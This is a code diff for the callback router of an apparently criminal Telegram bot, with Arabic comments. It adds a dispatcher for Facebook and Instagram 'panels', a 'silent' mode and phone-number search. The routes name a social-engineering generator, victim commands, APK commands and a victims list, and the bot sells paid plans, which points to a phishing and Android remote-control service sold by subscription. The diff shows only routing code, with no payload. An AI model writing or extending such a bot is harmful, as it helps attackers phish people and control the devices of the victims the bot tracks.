@@ -1,5 +1,5 @@
 # bot_handlers/callbacks/router.py
-# v4 — مع إعدادات + تأكيد الأدوات
+# v5 — مع tool_confirm
 
 from config import bot
 from logging_config import get_logger
@@ -35,45 +35,70 @@ ROUTES = [
                or d == "my_referrals"
                or d.startswith("tool_confirm_"), points_cb.handle),
 
-    # ─── 0.5. الهندسة الاجتماعية ───
+    # ─── 0.5. صفحات "بعد التأكيد" ───
+    (lambda d: d in ("fb_show_panel", "ig_show_panel",
+                     "silent_start", "search_phone_start"), 
+     lambda call, cid, uid, d: _handle_post_confirm(call, cid, uid, d)),
+
+    # ─── 1. الهندسة الاجتماعية ───
     (lambda d: d == "gen_se" or d.startswith("se_"), se_cb.handle),
 
-    # ─── 1. misc ───
+    # ─── 2. misc ───
     (lambda d: d == "noop", misc_cb.handle),
     (lambda d: d == "back_to_main", misc_cb.handle),
 
-    # ─── 2. help ───
+    # ─── 3. help ───
     (lambda d: d == "help_guide" or d.startswith("help_page_"), help_cb.handle),
 
-    # ─── 3. search ───
+    # ─── 4. search ───
     (lambda d: d == "search_menu" or d.startswith("search_"), search_cb.handle),
 
-    # ─── 4. facebook ───
-    (lambda d: d == "gen_fb" or d.startswith("fb_site_") or d.startswith("fb_stats_"), fb_cb.handle),
+    # ─── 5. facebook ───
+    (lambda d: d == "gen_fb" or d.startswith("fb_"), fb_cb.handle),
 
-    # ─── 5. instagram ───
-    (lambda d: d == "gen_ig" or d.startswith("ig_site_") or d.startswith("ig_stats_"), ig_cb.handle),
+    # ─── 6. instagram ───
+    (lambda d: d == "gen_ig" or d.startswith("ig_"), ig_cb.handle),
 
-    # ─── 6. silent ───
+    # ─── 7. silent ───
     (lambda d: d in ("gen_silent", "silent_new", "silent_stats", "silent_recent"), silent_cb.handle),
 
-    # ─── 7. dashboard ───
+    # ─── 8. dashboard ───
     (lambda d: d == "open_dashboard", dash_cb.handle),
 
-    # ─── 8. payment/my_account ───
+    # ─── 9. payment/my_account ───
     (lambda d: d in ("payment_menu", "show_plans", "my_account") or d.startswith("buy_plan_"), payment_cb.handle),
 
-    # ─── 9. updates ───
+    # ─── 10. updates ───
     (lambda d: d.startswith("upd_"), upd_cb.handle),
 
-    # ─── 10. admin ───
+    # ─── 11. admin ───
     (lambda d: d == "admin_panel" or d.startswith("admin_"), admin_cb.handle),
 
-    # ─── 11-13. victim/apk commands ───
+    # ─── 12. victim commands ───
     (lambda d: d.startswith("vcmd_"), vcmd_cb.handle),
+
+    # ─── 13. apk commands ───
     (lambda d: d.startswith("apk_cmd_"), apk_cmd_cb.handle),
+
+    # ─── 14. victims ───
     (lambda d: d.startswith("v_"), victims_cb.handle),
 ]
+
+
+def _handle_post_confirm(call, chat_id, user_id, data):
+    """يوزّع الصفحات اللي بتفتح بعد التأكيد"""
+    if data == "fb_show_panel":
+        from .facebook import _show_fb_panel
+        _show_fb_panel(call, chat_id, user_id)
+    elif data == "ig_show_panel":
+        from .instagram import _show_ig_panel
+        _show_ig_panel(call, chat_id, user_id)
+    elif data == "silent_start":
+        from .silent import _start_silent
+        _start_silent(call, chat_id, user_id, "gen_silent")
+    elif data == "search_phone_start":
+        from .search import _start_phone_search
+        _start_phone_search(call, chat_id, user_id)
 
 
 @bot.callback_query_handler(func=lambda call: True)
